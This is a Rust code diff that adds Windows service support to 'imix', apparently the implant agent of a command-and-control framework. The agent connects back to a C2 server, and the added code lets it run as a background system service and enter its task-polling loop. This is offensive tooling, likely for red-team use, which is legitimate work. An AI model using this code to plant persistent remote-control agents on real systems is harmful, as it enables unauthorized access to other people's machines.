@@ -1,3 +1,6 @@
+#[macro_use]
+extern crate windows_service;
+
 use anyhow::Result;
 use c2::pb::c2_client::C2Client;
 use c2::pb::TaskOutput;
@@ -7,7 +10,9 @@ use imix::init::agent_init;
 use imix::tasks::{start_new_tasks, submit_task_output};
 use imix::{tasks, Config, TaskID};
 use std::collections::HashMap;
+use std::ffi::OsString;
 use std::time::Instant;
+use windows_service::service_dispatcher;
 
 fn get_callback_uri(imix_config: Config) -> Result<String> {
     Ok(imix_config.callback_config.c2_configs[0].uri.clone())
@@ -125,6 +130,100 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
     }
 }
 
+#[cfg(not(win_service))]
+define_windows_service!(ffi_service_main, my_service_main);
+
+#[cfg(not(win_service))]
+fn run_service(arguments: Vec<OsString>) -> windows_service::Result<()> {
+    use std::time::Duration;
+
+    use windows_service::{service::{ServiceControl, ServiceStatus, ServiceType, ServiceState, ServiceControlAccept, ServiceExitCode}, service_control_handler::{ServiceControlHandlerResult, self}};
+
+    let event_handler = move |control_event| -> ServiceControlHandlerResult {
+        match control_event {
+            ServiceControl::Stop | ServiceControl::Interrogate => {
+                ServiceControlHandlerResult::NoError
+            }
+            _ => ServiceControlHandlerResult::NotImplemented,
+        }
+    };
+
+    // Register system service event handler
+    let status_handle = service_control_handler::register("my_service_name", event_handler)?;
+
+    let next_status = ServiceStatus {
+        // Should match the one from system service registry
+        service_type: ServiceType::OWN_PROCESS,
+        // The new state
+        current_state: ServiceState::Running,
+        // Accept stop events when running
+        controls_accepted: ServiceControlAccept::STOP,
+        // Used to report an error when starting or stopping only, otherwise must be zero
+        exit_code: ServiceExitCode::Win32(0),
+        // Only used for pending states, otherwise must be zero
+        checkpoint: 0,
+        // Only used for pending states, otherwise must be zero
+        wait_hint: Duration::default(),
+        process_id: None,
+    };
+
+    // Tell the system that the service is running now
+    status_handle.set_service_status(next_status)?;
+
+    // Do some work
+
+    Ok(())
+}
+
+#[cfg(not(win_service))]
+fn my_service_main(arguments: Vec<OsString>) {
+    // The entry point where execution will start on a background thread after a call to
+    // `service_dispatcher::start` from `main`.
+    match run_service(arguments.clone()) {
+        Ok(local_ok) => {},
+        Err(local_err) => {
+            #[cfg(debug_assertions)]
+            eprintln!("Failed to start service: {}", local_err.to_string());
+        },
+    }
+
+    let runtime = tokio::runtime::Builder::new_multi_thread()
+        .worker_threads(128)
+        .enable_all()
+        .build()
+        .unwrap();
+
+    let cmd = Command::new("imix").arg(
+        arg!(
+            -c --config <FILE> "Sets a custom config file"
+        )
+        .required(false),
+    );
+
+    if let Ok(matches) = cmd.try_get_matches_from(arguments) {
+        if let Some(config_path) = matches.value_of("config") {
+            match runtime.block_on(main_loop(config_path.to_string(), None)) {
+                Ok(_) => {}
+                Err(error) => eprintln!(
+                    "Imix main_loop exited unexpectedly with config: {}\n{}",
+                    config_path.to_string(),
+                    error
+                ),
+            }
+        }
+    }
+
+    return;
+}
+// #[cfg(all(target_os = "windows", win_service))]
+#[cfg(not(win_service))]
+fn main() -> Result<(), windows_service::Error> {
+    service_dispatcher::start("myservice", ffi_service_main)?;
+    Ok(())
+}
+
+// #[cfg(not(win_service))]
+#[cfg(win_service)]
 pub fn main() -> Result<(), imix::Error> {
     let matches = Command::new("imix")
         .arg(
